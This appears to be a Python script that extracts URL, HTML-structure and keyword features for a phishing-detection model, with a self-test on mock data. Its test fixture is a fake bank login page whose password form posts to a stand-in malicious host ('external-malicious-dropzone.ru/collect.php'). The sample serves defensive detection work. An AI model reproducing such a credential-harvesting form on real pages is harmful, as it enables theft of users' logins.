import numpy as np
from bs4 import BeautifulSoup

# Importing previous files
from feature_extraction import extract_lexical_features
from url_title_matcher import match_url_score
from Html_scrapper import extract_html_structural_features

def extract_content_keywords(soup: BeautifulSoup) -> dict:
    """Scans visible text layout segments to extract target risk parameter keywords."""
    features = {}
    if not soup:
        return {'Bank': 0.0, 'Pay': 0.0, 'Crypto': 0.0}
        
    text_content = soup.get_text().lower()
    features['Bank'] = float(text_content.count('bank'))
    features['Pay'] = float(text_content.count('pay'))
    features['Crypto'] = float(text_content.count('crypto'))
    
    return features

def generate_master_feature_vector(url: str, raw_html: str, soup: BeautifulSoup) -> tuple:
    """
    Consolidates every single extraction parameter into a single, comprehensive 
    ordered array vector that matches the shared spreadsheet layout perfectly.
    """
    # 1. Run our upgraded URL feature machine (19 features)
    lexical_profile = extract_lexical_features(url)
    
    # 2. Extract Algorithm 1 Title-Matching Derived Metric (1 feature)
    page_title = soup.find('title').text.strip() if (soup and soup.find('title')) else ""
    lexical_profile['DomainTitleMatchScore'] = match_url_score(page_title, url)
    
    # 3. Pull structural layout DOM markers (Includes your brand new NoOfCSS column!)
    structural_profile = extract_html_structural_features(raw_html, soup)
    
    # 4. Pull keyword content flags (3 features)
    keyword_profile = extract_content_keywords(soup)
    
    # 5. Build the comprehensive data record profile using explicit dictionary unpacking
    complete_record_matrix = {**lexical_profile, **structural_profile, **keyword_profile}
    
    # Convert the sorted parameter mapping down to a pristine 1D numerical input vector row
    vector_row = np.array(list(complete_record_matrix.values()), dtype=float)
    
    return vector_row, complete_record_matrix

# =====================================================================
# Verification Execution & Table Formatting Engine
# =====================================================================
if __name__ == "__main__":
    sample_url = "https://secure-bank-login-portal.com/update"
    
    # We explicitly add <style> elements to this mock HTML string to trigger NoOfCSS
    sample_html = """
    <html>
        <head>
            <title>Secure Bank Login</title>
            <style> body { background: #fff; } </style>
            <link rel="stylesheet" href="style.css">
            <meta name="description" content="Secure portal link">
        </head>
        <body>
            <img src='logo.png' alt='bank brand'>
            <form action='http://external-malicious-dropzone.ru/collect.php' method='POST'>
                <input type='password' name='user_pass'>
                <input type='submit' value='Login'>
            </form>
            <a href='#'>Empty Link Anchor</a>
            <p>Pay your bills safely here. Crypto payments not accepted.</p>
        </body>
    </html>
    """
    sample_soup = BeautifulSoup(sample_html, 'html.parser')
    
    # Unpack both the raw vector array and the readable matrix dictionary
    raw_vector, readable_matrix = generate_master_feature_vector(sample_url, sample_html, sample_soup)
    
    print("=" * 70)
    print("        HUMAN-READABLE FEATURE PIPELINE MATRIX AUDIT")
    print("=" * 70)
    print(f"{'SPREADSHEET COLUMN NAME':<28} | {'EXTRACTED VALUE':<15} | {'DATA TYPE'}")
    print("-" * 70)
    
    # Loop over every single feature value and print it in a pristine spreadsheet format
    for col_name, value in readable_matrix.items():
        if value.is_integer():
            formatted_val = f"{int(value)}"
        else:
            formatted_val = f"{value:.4f}"
            
        print(f"{col_name:<28} | {formatted_val:<15} | Float64")
        
    print("-" * 70)
    print(f"Total Structural Columns Extracted: {len(raw_vector)}")
    print(f"Machine Ingestion Array Shape     : {raw_vector.shape}")
    print("=" * 70)